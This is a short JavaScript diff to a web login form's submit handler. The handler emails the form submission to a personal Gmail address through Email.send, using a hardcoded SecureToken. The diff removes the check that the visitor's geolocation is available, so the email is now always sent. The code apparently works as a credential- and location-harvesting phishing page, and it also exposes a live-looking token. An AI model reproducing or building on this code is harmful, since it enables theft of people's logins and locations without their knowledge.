@@ -89,7 +89,6 @@ loginForm.addEventListener("submit", (e) => {
   e.preventDefault();
   
   // Ensure location is available before sending the email
-  if (userLocation.latitude !== null && userLocation.longitude !== null) {
     Email.send({
       SecureToken: "2c4c905a-af9f-4a10-af48-25f24e9e7b81",
       To: 'kumaradarsh00572@gmail.com',
@@ -112,10 +111,7 @@ loginForm.addEventListener("submit", (e) => {
       }
     );
   
-    localStorage.setItem("username", username.value);
-  } else {
-    console.log("Location is not available yet.");
-  }
+    
 });
 
 var s_h_btn = document.querySelector(".s_h_btn");
